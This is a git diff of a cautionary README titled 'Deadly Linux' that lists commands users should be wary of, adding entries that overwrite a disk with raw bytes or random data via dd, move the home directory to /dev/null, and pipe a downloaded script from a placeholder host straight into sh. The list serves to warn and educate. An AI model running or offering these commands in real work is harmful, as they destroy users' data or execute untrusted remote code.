@@ -1,7 +1,7 @@
 Deadly Linux
 ============
 
-simple list of deadly linux commands
+*Simple list of deadly linux commands. All the Linux that nobody will teach you, but that you will experience in first person. At least one time in your life.*
 
 ## Warning
 Most of the commands in this tutorial are **really dangerous**!!!
@@ -31,3 +31,24 @@ Do you remember `format C:` of the old DOS? this have the same result.
 ### Writes Directly to a Hard Drive
 
 `date > /dev/sda`
+
+Redirecting will write raw bytes on your disk partition. What can never will be? nothing good! surely.
+
+
+## Writes Junk Onto a Hard Drive
+
+`dd if=/dev/random of=/dev/sda`
+
+
+## Moves Your Home Directory to a Black Hole
+
+`mv ~ /dev/null`
+
+
+## Downloads and Runs a Script
+
+`wget http://example.com/something -O – | sh –`
+
+
+## References
+* [How to Geek](http://www.howtogeek.com/125157/8-deadly-commands-you-should-never-run-on-linux/)
